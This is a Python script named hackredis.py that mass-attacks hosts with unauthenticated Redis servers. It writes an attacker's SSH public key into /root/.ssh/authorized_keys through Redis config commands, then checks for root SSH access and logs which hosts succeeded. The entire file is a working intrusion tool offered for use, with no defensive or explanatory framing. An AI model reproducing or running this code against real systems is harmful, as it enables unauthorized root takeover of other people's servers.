#!/usr/bin/python
#coding:utf-8
#############################################################
## @file    hackredis.py                                   ##
## @date    2015-12-11                                     ##
## @author  evi1cg                                         ##
#############################################################
import redis
import argparse
import textwrap
import sys
import pexpect
def getargs():
	parser = argparse.ArgumentParser(prog='hackredis.py', formatter_class=argparse.RawTextHelpFormatter, description=textwrap.dedent('''\
	For Example:
	-----------------------------------------------------------------------------
	python hackredis.py  -l ip.txt -p 6379 -r foo.txt -sp 22'''))
	parser.add_argument('-l', dest='iplist', type=str, help='the hosts of target')
	parser.add_argument('-p', dest='port', default=6379, type=int, help='the redis default port')
	parser.add_argument('-r', dest='id_rsafile', type=str, help='the ssh id_rsa file you generate')
	parser.add_argument('-sp', dest='ssh_port', type=int,default=22, help='the ssh port')
	if(len(sys.argv[1:]) / 2 != 4):
		sys.argv.append('-h')
	return parser.parse_args()

def hackredis(host,port):
	ck = 0
	try:
		print "[*] Attacking ip:%s"%host
		r =redis.StrictRedis(host=host,port=port,db=0,socket_timeout=2)
		r.flushall
		r.set('crackit',foo)
		r.config_set('dir','/root/.ssh/')
		r.config_set('dbfilename','authorized_keys')
		r.save()
		ck =1
	except:
		print "\033[1;31;40m[-]\033[0m Something wrong with %s"%host
		write(host,2)
		ck =0
	if ck == 1:
		check(host)
	else:
		pass

def check(host):
	print '\033[1;33;40m[*]\033[0m Check connecting... '
	try:
		ssh = pexpect.spawn('ssh root@%s -p %d' %(host,ssh_port))
		i = ssh.expect('[#\$]',timeout=2)
		if i == 0:
			print "\033[1;34;40m[+]\033[0m Success !"
			write(host,1)
		else:
			pass
	except:
		print "\033[1;32;40m[-]\033[0m Failed to connect !"
		write(host,3)
def write(host,suc):
	if suc == 1:
		filesname = 'success.txt'
	elif suc ==2:
		filesname = 'fail.txt'
	elif suc ==3:
		filesname = 'unconnect.txt'
	else:
		pass
  	file_object = open(filesname,'a')
  	file_object.write(host+'\n')
  	file_object.close()


def main():
	global foo,ssh_port
	paramsargs = getargs()
	try:
		hosts = open(paramsargs.iplist,"r")
	except(IOError):
		print "Error: Check your hostfile path\n"
		sys.exit(1) 
	port = paramsargs.port
	ssh_port = paramsargs.ssh_port
	try:
		foo = '\n\n\n'+open(paramsargs.id_rsafile,"r").readline()+'\n\n\n'
	except(IOError):
		print "Error: Check your wordlist path\n"
		sys.exit(1)     
	ips = [p.replace('\n','') for p in hosts]
	for ip in ips:
		hackredis(ip.strip(),port)


if __name__ == "__main__":
	main()